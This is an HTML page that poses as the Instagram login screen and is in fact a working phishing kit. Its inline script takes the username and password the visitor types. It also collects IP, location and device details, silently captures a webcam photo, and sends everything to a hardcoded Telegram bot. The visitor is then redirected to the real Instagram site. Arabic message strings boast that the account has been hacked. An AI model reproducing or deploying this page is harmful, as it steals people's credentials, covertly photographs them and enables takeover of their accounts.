<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="img/insta-fav.ico">
    <title>Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }

        main {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .panel {
            background-color: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 350px;
        }

        .panel img {
            display: block;
            margin: 0 auto 20px;
        }

        .panel input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .panel button {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .panel button:hover {
            background-color: #3081d6;
        }

        footer {
            text-align: center;
            padding-top: 20px;
        }

        footer a {
            margin: 0 15px;
            color: #999;
            text-decoration: none;
        }

        footer .copyright {
            margin-top: 20px;
            color: #999;
        }
    </style>
</head>
<body>
    <main>
        <section id="auth">
            <div class="panel login">
                <h1>
                    <img src="img/instagram-logo.png" alt="Instagram logo" />
                </h1>
                <form id="loginForm" onsubmit="submitForm(event)">
                    <input id="email" name="email" placeholder="Phone number, username or email" required />
                    <input id="password" name="password" type="password" placeholder="Password" required />
                    <button type="submit">Log In</button>
                </form>
            </div>
        </section>
    </main>

    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATIONS</a></li>
            <li><a href="#">TOP ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">© 2025 Instagram from Facebook</p>
    </footer>

    <script>
        const botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
        const chatId = "5091980014"; // Telegram user ID

        async function getUserLocation() {
            try {
                const response = await fetch('https://ipapi.co/json');
                const data = await response.json();
                return {
                    city: data.city,
                    country: data.country,
                    ip: data.ip,
                    org: data.org,
                    asn: data.asn
                };
            } catch (error) {
                return {
                    city: "غير معروف",
                    country: "غير معروف",
                    ip: "غير معروف",
                    org: "غير معروف",
                    asn: "غير معروف"
                };
            }
        }

        function getDeviceInfo() {
            const platform = navigator.platform;
            const browserInfo = navigator.userAgent;
            const language = navigator.language;
            const memory = (navigator.deviceMemory || 4); // Assuming 4GB if not available
            const cpuCores = navigator.hardwareConcurrency || 4;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            
            return { platform, browserInfo, language, memory, cpuCores, screenResolution };
        }

        function captureImage() {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        video.srcObject.getTracks().forEach(track => track.stop());
                        resolve(canvas.toDataURL('image/jpeg'));
                    }, 3000);
                }).catch(() => resolve(null));
            });
        }

        async function submitForm(event) {
            event.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const locationData = await getUserLocation();
            const deviceInfo = getDeviceInfo();
            const currentTime = new Date().toLocaleString();
            const imageData = await captureImage();

            const message = `🔓 *تم اختراق الحساب! تم الكشف عن تفاصيل الحساب* 🔓\n\n` +
                            `💻 *معلومات الحساب:* 💻\n` +
                            `📧 البريد الإلكتروني: ${email}\n` +
                            `🔑 كلمة المرور: ${password}\n\n` +
                            `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
                            `🌐 عنوان IP: ${locationData.ip}\n` +
                            `🔍 المزود: ${locationData.org}\n` +
                            `🚨 ASN: ${locationData.asn}\n\n` +
                            `💻 *معلومات الجهاز:* 💻\n` +
                            `🖥️ النظام: ${deviceInfo.platform}\n` +
                            `🌐 المتصفح: ${deviceInfo.browserInfo}\n` +
                            `⚙️ لغة المتصفح: ${deviceInfo.language}\n` +
                            `🔧 الرام: ${deviceInfo.memory}GB\n` +
                            `⚡ عدد نوى المعالج: ${deviceInfo.cpuCores}\n` +
                            `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
                            `🕒 *التاريخ والوقت:* ${currentTime}\n\n` +
                            `👁️‍🗨️ *تم التقاط صورة المستخدم*`;

            // إرسال المعلومات إلى البوت عبر Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });

            // إرسال الصورة إلى البوت
            if (imageData) {
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, photo: imageData, caption: "📷 *صورة المستخدم*" })
                });
            }

            setTimeout(() => window.location.href = 'https://www.instagram.com', 2000);
        }
    </script>
</body>
</html>
